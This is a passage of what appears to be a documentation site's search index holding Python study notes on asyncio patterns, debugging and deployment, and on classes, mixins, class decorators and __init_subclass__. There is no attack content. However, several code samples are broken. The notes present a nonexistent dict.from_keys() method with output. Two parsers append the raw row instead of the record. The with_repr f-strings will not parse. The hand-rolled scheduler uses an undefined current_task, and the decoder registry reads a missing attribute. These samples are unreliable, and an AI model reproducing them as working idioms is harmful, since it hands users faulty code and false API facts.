asyncio.get_event_loop()\nloop.run_until_complete(main())\n</code></pre>"},{"location":"python/async/#122-asynchronous-process-communication","title":"12.2. Asynchronous Process Communication","text":"<p>Communicate between processes using <code>asyncio</code> and <code>multiprocessing</code>:</p> <pre><code>import asyncio\nimport multiprocessing\n\ndef worker(q):\n    for i in range(5):\n        q.put(i)\n        print(f\"Produced {i}\")\n\nasync def async_consumer(q):\n    for _ in range(5):\n        item = await loop.run_in_executor(None, q.get)\n        print(f\"Consumed {item}\")\n\nqueue = multiprocessing.Queue()\nprocess = multiprocessing.Process(target=worker, args=(queue,))\n\nloop = asyncio.get_event_loop()\nprocess.start()\nloop.run_until_complete(async_consumer(queue))\nprocess.join()\n</code></pre>"},{"location":"python/async/#123-challenges-and-considerations","title":"12.3. Challenges and Considerations","text":"<ul> <li>Error Handling: Ensure that exceptions in worker processes are properly propagated and handled.</li> <li>Data Serialization: Remember that data sent between processes needs to be serialized and deserialized, which can introduce overhead.</li> <li>Resource Management: Ensure all processes are cleaned up to avoid resource leaks or zombie processes.</li> </ul> <p>Next topic: Advanced Patterns and Designs in Async Applications.</p>"},{"location":"python/async/#13-advanced-patterns-and-designs-in-async-applications","title":"13. Advanced Patterns and Designs in Async Applications","text":""},{"location":"python/async/#131-event-driven-architecture","title":"13.1. Event-driven Architecture","text":"<p>Using <code>asyncio</code>, you can build an event-driven system where components react to events rather than follow a strict sequential order:</p> <pre><code>class EventBus:\n    def __init__(self):\n        self._listeners = {}\n\n    def add_listener(self, event, listener):\n        if event not in self._listeners:\n            self._listeners[event] = []\n        self._listeners[event].append(listener)\n\n    async def emit(self, event, data):\n        for listener in self._listeners.get(event, []):\n            await listener(data)\n\nasync def print_on_event(data):\n    print(f\"Received event with data: {data}\")\n\nbus = EventBus()\nbus.add_listener(\"data_event\", print_on_event)\n\nasync def main():\n    await bus.emit(\"data_event\", \"Some event data\")\n\nasyncio.run(main())\n</code></pre>"},{"location":"python/async/#132-service-actor-pattern","title":"13.2. Service Actor Pattern","text":"<p>In an async world, actors can be lightweight services that hold state and provide methods to act on that state:</p> <pre><code>class ServiceActor:\n    def __init__(self):\n        self._state = 0\n\n    async def increment(self):\n        self._state += 1\n        print(f\"State incremented to {self._state}\")\n\n    async def decrement(self):\n        self._state -= 1\n        print(f\"State decremented to {self._state}\")\n\nactor = ServiceActor()\n\nasync def main():\n    await actor.increment()\n    await actor.decrement()\n\nasyncio.run(main())\n</code></pre>"},{"location":"python/async/#133-reactive-extensions-rxpy-with-async","title":"13.3. Reactive Extensions (RxPY with Async)","text":"<p><code>RxPY</code> supports asynchronous operations and can be integrated with <code>asyncio</code> for reactive programming:</p> <pre><code>import rx\nfrom rx.scheduler.eventloop import AsyncIOScheduler\nimport asyncio\n\nasync def source(observer, scheduler):\n    await asyncio.sleep(1, loop=scheduler.loop)\n    observer.on_next(42)\n    observer.on_completed()\n\nstream = rx.create(source)\nstream.subscribe(on_next=print, scheduler=AsyncIOScheduler(asyncio.get_event_loop()))\n\nasyncio.get_event_loop().run_forever()\n</code></pre> <p>Next topic: Debugging and Profiling Asynchronous Python Applications.</p>"},{"location":"python/async/#14-debugging-and-profiling-asynchronous-python-applications","title":"14. Debugging and Profiling Asynchronous Python Applications","text":"<p>Debugging and profiling asynchronous applications can be different than traditional synchronous applications. Let's look into techniques and tools available for <code>asyncio</code>:</p>"},{"location":"python/async/#141-debug-mode-in-asyncio","title":"14.1. Debug Mode in <code>asyncio</code>","text":"<p><code>asyncio</code> provides a debug mode that can help catch common mistakes:</p> <pre><code>import asyncio\n\nasync def forgot_await():\n    asyncio.sleep(1)  # Missing `await`\n\nasyncio.get_event_loop().set_debug(True)\nasyncio.run(forgot_await())\n</code></pre> <p>In debug mode, the above will print a warning indicating that a coroutine has not been awaited.</p>"},{"location":"python/async/#142-logging-unclosed-resources","title":"14.2. Logging Unclosed Resources","text":"<p>To help debug issues related to unclosed resources like sockets, you can enable logging:</p> <pre><code>import logging\n\nlogging.basicConfig(level=logging.DEBUG)\n</code></pre> <p>This will print detailed debug information about resources that were not closed properly.</p>"},{"location":"python/async/#143-profiling-with-aio-profiler","title":"14.3. Profiling with <code>aio-profiler</code>","text":"<p><code>aio-profiler</code> is a tool specifically designed to profile asynchronous Python applications:</p> <pre><code>pip install aio-profiler\n</code></pre> <p>Using <code>aio-profiler</code>, you can visualize where your asynchronous application spends its time, helping optimize performance-critical sections.</p>"},{"location":"python/async/#144-debugging-with-ides","title":"14.4. Debugging with IDEs","text":"<p>Modern IDEs, like PyCharm, have support for debugging asynchronous Python code. You can set breakpoints, inspect variable values, and step through async code just like synchronous code.</p>"},{"location":"python/async/#145-detecting-deadlocks","title":"14.5. Detecting Deadlocks","text":"<p>If your asynchronous code appears to hang, it could be due to a deadlock. This often happens when tasks are waiting for each other in a cycle. In such cases, tools like <code>aio-deadlock-detector</code> can help identify and break such cycles.</p>"},{"location":"python/async/#146-monitoring-asynchronous-tasks","title":"14.6. Monitoring Asynchronous Tasks","text":"<p>Using the <code>asyncio.all_tasks()</code> function, you can monitor all running tasks. This can be useful to ensure no tasks are left dangling:</p> <pre><code>import asyncio\n\nasync def example_task():\n    await asyncio.sleep(1)\n\nasync def main():\n    task = asyncio.create_task(example_task())\n    print(\"Running tasks:\", asyncio.all_tasks())\n\nasyncio.run(main())\n</code></pre> <p>Next topic: Scaling and Deploying Asynchronous Applications.</p>"},{"location":"python/async/#15-scaling-and-deploying-asynchronous-applications","title":"15. Scaling and Deploying Asynchronous Applications","text":"<p>Once your asynchronous application is developed and tested, the next step is to deploy and scale it. Here are some strategies and considerations:</p>"},{"location":"python/async/#151-event-loop-implementations","title":"15.1. Event Loop Implementations","text":"<p>While the default event loop in <code>asyncio</code> is sufficient for most tasks, there are alternative implementations like <code>uvloop</code> which can offer better performance:</p> <pre><code>pip install uvloop\n</code></pre> <pre><code>import asyncio\nimport uvloop\n\nasyncio.set_event_loop_policy(uvloop.EventLoopPolicy())\n</code></pre>"},{"location":"python/async/#152-load-balancing","title":"15.2. Load Balancing","text":"<p>Just like synchronous applications, asynchronous applications can benefit from load balancing to distribute incoming traffic among multiple instances of the application. Common load balancers like NGINX or HAProxy can be used.</p>"},{"location":"python/async/#153-distributed-systems-and-microservices","title":"15.3. Distributed Systems and Microservices","text":"<p>When scaling applications, consider breaking them into microservices. Asynchronous communication can be established between services using message queues like RabbitMQ or Kafka.</p>"},{"location":"python/async/#154-database-connections","title":"15.4. Database Connections","text":"<p>When using asynchronous databases, be aware of connection limits. Use connection pooling and avoid holding onto connections longer than necessary.</p>"},{"location":"python/async/#155-memory-and-resource-leaks","title":"15.5. Memory and Resource Leaks","text":"<p>Asynchronous applications, especially long-running ones, should be monitored for memory and resource leaks. Tools like <code>objgraph</code> or built-in Python profilers can help identify and fix such leaks.</p>"},{"location":"python/async/#156-error-monitoring-and-alerting","title":"15.6. Error Monitoring and Alerting","text":"<p>Implement monitoring and alerting to keep an eye on exceptions and errors in production. Tools like Sentry can be integrated to capture and notify about runtime errors.</p> <p>Next topic: Conclusion and Continuous Learning in Asynchronous Programming.</p>"},{"location":"python/async/#16-conclusion-and-continuous-learning-in-asynchronous-programming","title":"16. Conclusion and Continuous Learning in Asynchronous Programming","text":"<p>The landscape of asynchronous programming in Python is vast and continuously evolving. With tools like <code>asyncio</code> and the expanding ecosystem around it, developers have powerful mechanisms to write efficient, scalable, and maintainable applications.</p> <p>However, the journey doesn't end with mastering <code>asyncio</code> or any specific library. The Python community is vibrant and always innovating. It's essential to stay updated, participate in discussions, and continuously experiment with new techniques, tools, and best practices.</p> <p>Asynchronous programming, once an advanced topic, is slowly becoming a core skill for Python developers. Embrace the paradigm, understand its intricacies, and leverage it to build the next generation of responsive and performant Python applications.</p> <p>End of Topics.</p>"},{"location":"python/async/#extra-async-without-asyncio","title":"EXTRA async without asyncio","text":"<pre><code>import time\n\nclass Task:\n    def __init__(self, gen):\n        self._gen = gen\n        self._wake_up_time = 0\n\n    def run(self):\n        if time.time() &lt; self._wake_up_time:\n            return False\n        try:\n            next(self._gen)\n            return True\n        except StopIteration:\n            return False\n\n    def set_wake_up_time(self, delay):\n        self._wake_up_time = time.time() + delay\n\nclass Scheduler:\n    def __init__(self):\n        self._tasks = []\n\n    def add_task(self, task_gen):\n        self._tasks.append(Task(task_gen))\n\n    def sleep(self, current_task, delay):\n        current_task.set_wake_up_time(delay)\n        self._tasks.append(current_task)\n\n    def run(self):\n        while self._tasks:\n            current_task = self._tasks.pop(0)\n            if not current_task.run():\n                self._tasks.append(current_task)\n\n# Global scheduler instance\nscheduler = Scheduler()\n\ndef async_sleep(delay):\n    yield\n    scheduler.sleep(current_task, delay)\n    yield\n\ndef coro1():\n    print(\"Coroutine 1: Start\")\n    yield from async_sleep(2)\n    print(\"Coroutine 1: After 2 seconds\")\n\ndef coro2():\n    print(\"Coroutine 2: Start\")\n    yield from async_sleep(1)\n    print(\"Coroutine 2: After 1 second\")\n\n# Add coroutines to the scheduler and run them\nscheduler.add_task(coro1())\nscheduler.add_task(coro2())\nscheduler.run()\n</code></pre>"},{"location":"python/classes/classes/","title":"Much about Classes and Object Oriented Programming","text":"<p>Classes are used to create new kinds of objects.</p>"},{"location":"python/classes/classes/#classes-example","title":"Classes Example","text":"<pre><code>class AccountPortfolio:\n    def __init__(self):\n        self.accounts = []\n\n    def add_account(self, account):\n        self.accounts.append(account)\n\n    def total_funds(self):\n        return sum(account.inquiry() for account in self.accounts)\n\n    def __len__(self):\n        return len(self.accounts)\n\n    def __getitem__(self, index):\n        return self.accounts[index]\n\n    def __iter__(self):\n        return iter(self.accounts)\n</code></pre>"},{"location":"python/classes/classes/#usage","title":"Usage","text":"<pre><code># Example\nport = AccountPortfolio()\nport.add_account(Account('Guido', 1000.0))\nport.add_account(Account('Eva', 50.0))\n\nprint(port.total_funds())    # -&gt; 1050.0\nlen(port)                    # -&gt; 2\n\n# Print the accounts\nfor account in port:\n    print(account)\n\n# Access an individual account by index\nport[1].inquiry()            # -&gt; 50.0\n</code></pre>"},{"location":"python/classes/classes/#avoiding-inheritance-via-composition","title":"Avoiding Inheritance via Composition","text":""},{"location":"python/classes/classes/#inheritance","title":"Inheritance","text":"<pre><code>class Stack(list):\n    def push(self, item):\n        self.append(item)\n\n# Example\ns = Stack()\ns.push(1)\ns.push(2)\ns.push(3)\ns.pop()     # -&gt; 3\ns.pop()     # -&gt; 2\n</code></pre>"},{"location":"python/classes/classes/#composition","title":"Composition","text":"<pre><code>class Stack:\n    def __init__(self):\n        self._items = list()\n\n    def push(self, item):\n        self._items.append(item)\n\n    def pop(self):\n        return self._items.pop()\n\n    def __len__(self):\n        return len(self._items)\n\n# Example use\ns = Stack()\ns.push(1)\ns.push(2)\ns.push(3)\ns.pop()    # -&gt; 3\ns.pop()     # -&gt; 2\n</code></pre>"},{"location":"python/classes/classes/#passing-container-as-argument","title":"Passing Container as Argument","text":"<pre><code>class Stack:\n    def __init__(self, *, container=None):\n        if container is None:\n            container = list()\n        self._items = container\n\n    def push(self, item):\n        self._items.append(item)\n\n    def pop(self):\n        return self._items.pop()\n\n    def __len__(self):\n        return len(self._items)\n\ns = Stack(container=array.array('i'))\ns.push(42)\ns.push(23)\ns.push('a lot')     # TypeError\n</code></pre> <p>This is also an example of what\u2019s known as dependency injection. Instead of hardwiring Stack to depend on list, you can make it depend on any container a user decides to pass in, provided it implements the required interface.</p>"},{"location":"python/classes/classes/#avoid-inheritance-via-functions","title":"Avoid Inheritance via Functions","text":"<p>If there is too much plumbing going on here. If you\u2019re writing a lot of single-method classes, consider using functions instead. </p>"},{"location":"python/classes/classes/#class-based-parsing","title":"Class Based Parsing","text":"<pre><code>class DataParser:\n    def parse(self, lines):\n        records = []\n        for line in lines:\n            row = line.split(',')\n            record = self.make_record(row)\n            records.append(row)\n        return records\n\n    def make_record(self, row):\n        raise NotImplementedError()\n\nclass PortfolioDataParser(DataParser):\n    def make_record(self, row):\n        return {\n           'name': row[0],\n           'shares': int(row[1]),\n           'price': float(row[2])\n        }\n\nparser = PortfolioDataParser()\ndata = parser.parse(open('portfolio.csv'))\n</code></pre>"},{"location":"python/classes/classes/#function-based-parsing","title":"Function Based Parsing","text":"<pre><code>def parse_data(lines, make_record):\n    records = []\n    for line in lines:\n        row = line.split(',')\n        record = make_record(row)\n        records.append(row)\n    return records\n\ndef make_dict(row):\n    return {\n        'name': row[0],\n        'shares': int(row[1]),\n        'price': float(row[2])\n    }\n\ndata = parse_data(open('portfolio.csv'), make_dict)\n</code></pre>"},{"location":"python/classes/classes/#dynamic-binding-and-duck-typing","title":"Dynamic Binding and Duck Typing","text":"<p>Dynamic binding is the runtime mechanism that Python uses to find the attributes of objects. This is what allows Python to work with instances without regard for their type. In Python, variable names do not have an associated type. Thus, the attribute binding process is independent of what kind of object <code>obj</code> is. If you make a lookup, such as <code>obj.name</code>, it will work on any <code>obj</code> whatsoever that happens to have a <code>name</code> attribute. This behavior is sometimes referred to as duck typing\u2014in reference to the adage \u201cif it looks like a duck, quacks like a duck, and walks like a duck, then it\u2019s a duck.\u201d</p> <p>Python programmers often write programs that rely on this behavior. For example, if you want to make a customized version of an existing object, you can either inherit from it, or you can create a completely new object that looks and acts like it but is otherwise unrelated. This latter approach is often used to maintain loose coupling of program components. For example, code may be written to work with any kind of object whatsoever as long as it has a certain set of methods. One of the most common examples is with various iterable objects defined in the standard library. There are all sorts of objects that work with the <code>for</code> loop to produce values\u2014lists, files, generators, strings, and so on. However, none of these inherit from any kind of special <code>Iterable</code> base class. They merely implement the methods required to perform iteration\u2014and it all works.</p>"},{"location":"python/classes/classes/#dont-inherit-builtin-types","title":"Don't Inherit Builtin Types","text":"<p><code>dict</code>, <code>list</code> they are written in C and bypass <code>__setitem__</code> and <code>__getitem__</code>.</p> <p>If you want to use <code>UserDict</code>, import it like this: <code>from collections import UserDict</code>.</p>"},{"location":"python/classes/classes/#class-variables-vs-methods","title":"Class Variables vs Methods","text":"<p>In a class definition, all functions are assumed to operate on an instance, which is always passed as the first parameter <code>self</code>. However, the class itself is also an object that can carry state and be manipulated as well. As an example, you could track how many instances have been created using a class variable <code>num_accounts</code>:</p> <pre><code>class Account:\n    num_accounts = 0\n\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self.balance = balance\n        Account.num_accounts += 1\n\n    def __repr__(self):\n        return f'{type(self).__name__}({self.owner!r}, {self.balance!r})'\n\n    def deposit(self, amount):\n        self.balance += amount\n\n    def withdraw(self, amount):\n        self.deposit(-amount)    # Must use self.deposit()\n\n    def inquiry(self):\n        return self.balance\n</code></pre> <p>Class variables are defined outside the normal <code>__init__()</code> method. To modify them, use the class, not <code>self</code>. For example:</p> <pre><code>&gt;&gt;&gt; a = Account('Guido', 1000.0)\n&gt;&gt;&gt; b = Account('Eva', 10.0)\n&gt;&gt;&gt; Account.num_accounts\n2\n</code></pre>"},{"location":"python/classes/classes/#classmethod-usage-alternative-way-of-creating-a-class","title":"<code>classmethod</code> Usage: Alternative Way of Creating a Class","text":"<pre><code>class Account:\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self.balance = balance\n\n    @classmethod\n    def from_xml(cls, data):\n        from xml.etree.ElementTree import XML\n        doc = XML(data)\n        return cls(doc.findtext('owner'),\n                   float(doc.findtext('amount')))\n\n# Example use\n\ndata = '''\n&lt;account&gt;\n    &lt;owner&gt;Guido&lt;/owner&gt;\n    &lt;amount&gt;1000.0&lt;/amount&gt;\n&lt;/account&gt;\n'''\na = Account.from_xml(data)\n</code></pre>"},{"location":"python/classes/classes/#configuration-of-classes","title":"Configuration of Classes","text":"<pre><code>import time\n\nclass Date:\n    datefmt = '{year}-{month:02d}-{day:02d}'\n    def __init__(self, year, month, day):\n        self.year = year\n        self.month = month\n        self.day = day\n\n    def __str__(self):\n        return self.datefmt.format(year=self.year,\n                                   month=self.month,\n                                   day=self.day)\n\n    @classmethod\n    def from_timestamp(cls, ts):\n        tm = time.localtime(ts)\n        return cls(tm.tm_year, tm.tm_mon, tm.tm_mday)\n\n    @classmethod\n    def today(cls):\n        return cls.from_timestamp(time.time())\n</code></pre> <p>This class features a class variable <code>datefmt</code> that adjusts output from the <code>__str__()</code> method. This is something that can be customized via inheritance:</p> <pre><code>class MDYDate(Date):\n    datefmt = '{month}/{day}/{year}'\n\nclass DMYDate(Date):\n    datefmt = '{day}/{month}/{year}'\n\n# Example\na = Date(1967, 4, 9)\nprint(a)       # 1967-04-09\n\nb = MDYDate(1967, 4, 9)\nprint(b)       # 4/9/1967\n\nc = DMYDate(1967, 4, 9)\nprint(c)      # 9/4/1967\n</code></pre>"},{"location":"python/classes/classes/#dictfrom_keys-example","title":"<code>dict.from_keys()</code> Example","text":"<pre><code>dict.from_keys(['a','b','c'], 0)\n# Output: {'a': 0, 'b': 0, 'c': 0}\n</code></pre>"},{"location":"python/classes/classes/#static-methods","title":"Static Methods","text":"<pre><code>class StandardPolicy:\n    @staticmethod\n    def deposit(account, amount):\n        account.balance += amount\n\n    @staticmethod\n    def withdraw(account, amount):\n        account.balance -= amount\n\n    @staticmethod\n    def inquiry(account):\n        return account.balance\n\nclass EvilPolicy(StandardPolicy):\n    @staticmethod\n    def deposit(account, amount):\n        account.balance += 0.95*amount\n\n    @staticmethod\n    def inquiry(account):\n        if random.randint(0,4) == 1:\n           return 1.10 * account.balance\n        else:\n           return account.balance\n\nclass Account:\n    def __init__(self, owner, balance, *, policy=StandardPolicy):\n        self.owner = owner\n        self.balance = balance\n        self.policy = policy\n\n    def __repr__(self):\n        return f'Account({self.policy}, {self.owner!r}, {self.balance!r})'\n\n    def deposit(self, amount):\n        self.policy.deposit(self, amount)\n\n    def withdraw(self, amount):\n        self.policy.withdraw(self, amount)\n\n    def inquiry(self):\n        return self.policy.inquiry(self)\n</code></pre>"},{"location":"python/classes/classes/#about-design-patterns","title":"About Design Patterns","text":"<p>In writing object-oriented programs, programmers sometimes get fixated on implementing named design patterns\u2014such as the strategy pattern, the flyweight pattern, the singleton pattern, and so forth. Many of these originate from the famous Design Patterns book by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides.</p> <p>If you are familiar with such patterns, the general design principles used in other languages can certainly be applied to Python. However, many of these documented patterns are aimed at working around specific issues that arise from the strict static type system of C++ or Java. The dynamic nature of Python renders a lot of these patterns obsolete, an overkill, or simply unnecessary.</p> <p>That said, there are a few overarching principles of writing good software\u2014such as striving to write code that is debuggable, testable, and extensible. Basic strategies such as writing classes with useful <code>__repr__()</code> methods, preferring composition over inheritance, and allowing dependency injection can go a long way towards these goals. Python programmers also like to work with code that can be said to be Pythonic. Usually, that means that objects obey various built-in protocols, such as iteration, containers, or context management. For example, instead of trying to implement some exotic data traversal pattern from a Java programming book, a Python programmer would probably implement it with a generator function feeding a <code>for</code> loop, or just replace the entire pattern with a few dictionary lookups.</p>"},{"location":"python/classes/classes/#properties","title":"Properties","text":"<p>As noted in the previous section, Python places no runtime restrictions on attribute values or types. However, such enforcement is possible if you put an attribute under the management of a so-called property. A property is a special kind of attribute that intercepts attribute access and handles it via user-defined methods. These methods have complete freedom to manage the attribute as they see fit. Here is an example:</p> <pre><code>import string\n\nclass Account:\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self._balance = balance\n\n    @property\n    def owner(self):\n        return self._owner\n\n    @owner.setter\n    def owner(self, value):\n        if not isinstance(value, str):\n            raise TypeError('Expected str')\n        if not all(c in string.ascii_uppercase for c in value):\n            raise ValueError('Must be uppercase ASCII')\n        if len(value) &gt; 10:\n            raise ValueError('Must be 10 characters or less')\n        self._owner = value\n\nclass SomeClass:\n    @property\n    def attr(self):\n        print('Getting')\n\n    @attr.setter\n    def attr(self, value):\n        print('Setting', value)\n\n    @attr.deleter\n    def attr(self):\n        print('Deleting')\n\n# Example\ns = SomeClass()\ns.attr         # Getting\ns.attr = 13    # Setting\ndel s.attr     # Deleting\n</code></pre>"},{"location":"python/classes/classes/#types-interfaces-abstract-classes","title":"Types, Interfaces, Abstract Classes","text":"<pre><code>class A:\n    pass\n\nclass B(A):\n    pass\n\nclass C:\n    pass\n\na = A()           # Instance of 'A'\nb = B()           # Instance of 'B'\nc = C()           # Instance of 'C'\n\ntype(a)           # Returns the class object A\nisinstance(a, A)  # Returns True\nisinstance(b, A)  # Returns True, B derives from A\nisinstance(b, C)  # Returns False, B not derived from C\n</code></pre> <p>Note: ABC must be implemented.</p> <pre><code>from abc import ABC, abstractmethod\n\nclass Stream(ABC):\n    @abstractmethod\n    def receive(self):\n        pass\n\n    @abstractmethod\n    def send(self, msg):\n        pass\n\n    @abstractmethod\n    def close(self):\n        pass\n</code></pre>"},{"location":"python/classes/classes/#multiple-inheritance-and-mixins","title":"Multiple Inheritance and Mixins","text":""},{"location":"python/classes/classes/#interfaces-using-abc-classes","title":"Interfaces using ABC Classes","text":"<pre><code>from abc import ABC, abstractmethod\n\nclass Stream(ABC):\n    @abstractmethod\n    def receive(self):\n        pass\n\n    @abstractmethod\n    def send(self, msg):\n        pass\n\n    @abstractmethod\n    def close(self):\n        pass\n\nclass Iterable(ABC):\n    @abstractmethod\n    def __iter__(self):\n        pass\n\n\nclass MessageStream(Stream, Iterable):\n    def receive(self):\n        ...\n\n    def send(self):\n        ...\n\n    def close(self):\n        ...\n\n    def __iter__(self):\n        ...\n</code></pre> <p><code>m = MessageStream()</code></p> <p><code>isinstance(m, Stream)     # -&gt; True</code></p> <p><code>isinstance(m, Iterable)   # -&gt; True</code></p>"},{"location":"python/classes/classes/#mixin-classes","title":"Mixin Classes","text":"<p>The other use of multiple inheritance is to define mixin classes. A mixin class is a class that modifies or extends the functionality of other classes. Consider the following class definitions:</p> <pre><code>class Duck:\n    def noise(self):\n        return 'Quack'\n\n    def waddle(self):\n        return 'Waddle'\n\nclass Trombonist:\n    def noise(self):\n        return 'Blat!'\n\n    def march(self):\n        return 'Clomp'\n\nclass Cyclist:\n    def noise(self):\n        return 'On your left!'\n\n    def pedal(self):\n        return 'Pedaling'\n</code></pre> <p>These classes are completely unrelated to each other. There is no inheritance relationship and they implement different methods. However, there is a shared commonality in that they each define a <code>noise()</code> method. Using that as a guide, you could define the following classes:</p> <pre><code>class LoudMixin:\n    def noise(self):\n        return super().noise().upper()\n\nclass AnnoyingMixin:\n    def noise(self):\n        return 3 * super().noise()\n\nclass LoudDuck(LoudMixin, Duck):\n    pass\n\nclass AnnoyingTrombonist(AnnoyingMixin, Trombonist):\n    pass\n\nclass AnnoyingLoudCyclist(AnnoyingMixin, LoudMixin, Cyclist):\n    pass\n</code></pre> <p><code>d = LoudDuck()</code></p> <p><code>d.noise()  # -&gt; 'QUACK'</code></p> <p><code>t = AnnoyingTrombonist()</code></p> <p><code>t.noise()  # -&gt; 'Blat!Blat!Blat!'</code></p> <p><code>c = AnnoyingLoudCyclist()</code></p> <p><code>c.noise()  # -&gt; 'ON YOUR LEFT!ON YOUR LEFT!ON YOUR LEFT!'</code></p> <p>Since mixin classes are defined in the same way as normal classes, it is best to include the word \"Mixin\" as part of the class name. This naming convention provides a greater clarity of purpose.</p> <p>To fully understand mixins, you need to know a bit more about how inheritance and the <code>super()</code> function work.</p> <p>First, whenever you use inheritance, Python builds a linear chain of classes known as the Method Resolution Order, or MRO for short. This is available as the <code>mro</code> attribute on a class. Here are some examples for single inheritance:</p> <pre><code>class Base:\n    pass\n\nclass A(Base):\n    pass\n\nclass B(A):\n    pass\n\nBase.__mro__  # -&gt; (&lt;class 'Base'&gt;, &lt;class 'object'&gt;)\nA.__mro__     # -&gt; (&lt;class 'A'&gt;, &lt;class 'Base'&gt;, &lt;class 'object'&gt;)\nB.__mro__     # -&gt; (&lt;class 'B'&gt;, &lt;class 'A'&gt;, &lt;class 'Base'&gt;, &lt;class 'object'&gt;)\n</code></pre>"},{"location":"python/classes/classes/#class-decorators-and-class-methods","title":"Class Decorators and Class Methods","text":""},{"location":"python/classes/classes/#factory-function-that-uses-the-registry","title":"Factory function that uses the registry","text":"<pre><code>def create_decoder(mimetype):\n    return _registry[mimetype]()\n</code></pre> <pre><code>@register_decoder\nclass TextDecoder:\n    mimetypes = [ 'text/plain' ]\n    def decode(self, data):\n        ...\n</code></pre> <pre><code>@register_decoder\nclass HTMLDecoder:\n    mimetypes = [ 'text/html' ]\n    def decode(self, data):\n        ...\n</code></pre> <pre><code>@register_decoder\nclass ImageDecoder:\n    mimetypes = [ 'image/png', 'image/jpg', 'image/gif' ]\n    def decode(self, data):\n        ...\n</code></pre>"},{"location":"python/classes/classes/#example-usage","title":"Example usage","text":"<pre><code>decoder = create_decoder('image/jpg')\n</code></pre> <p>A class decorator is free to modify the contents of the class it\u2019s given. For example, it might even rewrite existing methods. This is a common alternative to mixin classes or multiple inheritance. For example, consider these decorators:</p>"},{"location":"python/classes/classes/#decorator-override-function","title":"decorator override function","text":"<pre><code>def loud(cls):\n    orig_noise = cls.noise\n    def noise(self):\n        return orig_noise(self).upper()\n    cls.noise = noise\n    return cls\n\ndef annoying(cls):\n    orig_noise = cls.noise\n    def noise(self):\n        return 3 * orig_noise(self)\n    cls.noise = noise\n    return cls\n\n@annoying\n@loud\nclass Cyclist(object):\n    def noise(self):\n        return 'On your left!'\n\n    def pedal(self):\n        return 'Pedaling'\n</code></pre>"},{"location":"python/classes/classes/#add-code-to-class-at-runtime","title":"Add code to class at runtime","text":"<pre><code>class Point:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n    def __repr__(self):\n        return f'{type(self).__name__}({self.x!r}, {self.y!r})'\n</code></pre> <p>Writing such methods is often annoying. Perhaps a class decorator could create the method for you?</p> <pre><code>import inspect\ndef with_repr(cls):\n    args = list(inspect.signature(cls).parameters)\n    argvals = ', '.join('{self.%s!r}' % arg for arg in args)\n    code = 'def __repr__(self):\\n'\n    code += f' return f'{cls.__name__}({argvals})'\\n'\n    locs = { }\n    exec(code, locs)\n    cls.__repr__ = locs['__repr__']\n    return cls\n\n# Example\n@with_repr\nclass Point:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n</code></pre> <p>In this example, a repr() method is generated from the calling signature of the init() method. The method is created as a text string and passed to exec() to create a function. That function is attached to the class.</p> <p>Similar code generation techniques are used in parts of the standard library. For example, a convenient way to define data structures is to use a dataclass:</p> <pre><code>from dataclasses import dataclass\n\n@dataclass\nclass Point:\n    x: int\n    y: int\n</code></pre> <p>A dataclass automatically creates methods such as init() and repr() from class type hints. The methods are created using exec(), similarly to the prior example. Here\u2019s how the resulting Point class works:</p> <pre><code>p = Point(2, 3)\np\n</code></pre> <p>Output: <pre><code>Point(x=2, y=3)\n</code></pre></p> <p>One downside of such an approach is poor startup performance. Dynamically creating code with <code>exec()</code> bypasses the compilation optimizations that Python normally applies to modules. Defining a large number of classes in this way may therefore significantly slow down the importing of your code.</p>"},{"location":"python/classes/classes/#supervised-inheritance-__init_subclass__","title":"Supervised Inheritance - <code>__init_subclass__</code>","text":"<p>As you saw in the previous section, sometimes you want to define a class and perform additional actions. A class decorator is one mechanism for doing this. However, a parent class can also perform extra actions on behalf of its subclasses. This is accomplished by implementing an <code>__init_subclass__(cls)</code> class method. For example:</p> <pre><code>class Base:\n    @classmethod\n    def __init_subclass__(cls):\n        print('Initializing', cls)\n\n# Example (should see 'Initializing' message for each class)\nclass A(Base):\n    pass\n\nclass B(A):\n    pass\n</code></pre> <p>If an <code>__init_subclass__()</code> method is present, it is triggered automatically upon the definition of any child class. This happens even if the child is buried deeply in an inheritance hierarchy.</p> <p>Many of the tasks commonly performed with class decorators can be performed with <code>__init_subclass__()</code> instead. For example, class registration:</p> <pre><code>class DecoderBase:\n    _registry = { }\n    @classmethod\n    def __init_subclass__(cls):\n        for mt in cls.mimetypes:\n            DecoderBase._registry[mt.mimetype] = cls\n\n# Factory function that uses the registry\ndef create_decoder(mimetype):\n    return DecoderBase._registry[mimetype]()\n\nclass TextDecoder(DecoderBase):\n    mimetypes = [ 'text/plain' ]\n    def decode(self, data):\n        ...\n\nclass HTMLDecoder(DecoderBase):\n    mimetypes = [ 'text/html' ]\n    def decode(self, data):\n        ...\n\nclass ImageDecoder(DecoderBase):\n    mimetypes = [ 'image/png', 'image/jpg', 'image/gif' ]\n    def decode(self, data):\n        ...\n</code></pre>"},{"location":"python/classes/classes/#class-initialization-with-__repr__","title":"Class Initialization with <code>__repr__</code>","text":"<pre><code>import inspect\nclass Base:\n    @classmethod\n    def __init_subclass__(cls):\n        # Create a __repr__ method\n        args = list(inspect.signature(cls).parameters)\n        argvals = ', '.join('{self.%s!r}' % arg for arg in args)\n        code = 'def __repr__(self):\\n'\n        code += f' return f'{cls.__name__}({argvals})'\\n'\n        locs = { }\n        exec(code, locs)\n        cls.__repr__ = locs['__repr__']\n\nclass Point(Base):\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n</code></pre> <p>If multiple inheritance is being used, you should use <code>super()</code> to make sure all classes that implement <code>__init_subclass__()</code> get called. For example:</p> <pre><code>class A:\n    @classmethod\n    def __init_subclass__(cls):\n        print('A.init_subclass')\n        super().__init_subclass__()\n\nclass B:\n    @classmethod\n    def __init_subclass__(cls):\n        print('B.init_subclass')\n        super().__init_subclass__()\n\n# Should see output from both classes here\nclass C(A, B):\n    pass\n</code></pre>"},{"location":"python/classes/classes/#object-life-cycle-and-memory-management","title":"Object Life Cycle and Memory Management","text":"<p>When a class is defined, the resulting class is a factory for creating new instances. For example:</p> <pre><code>class Account:\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self.balance = balance\n</code></pre> <p>Create some <code>Account</code> instances: <pre><code>a = Account('Guido', 1000.0)\nb = Account('Eva', 25.0)\n</code></pre></p> <p>The creation of an instance is carried out in two steps using the special method <code>__new__()</code> that creates a new instance and <code>__init__()</code> that initializes it. For example, the operation 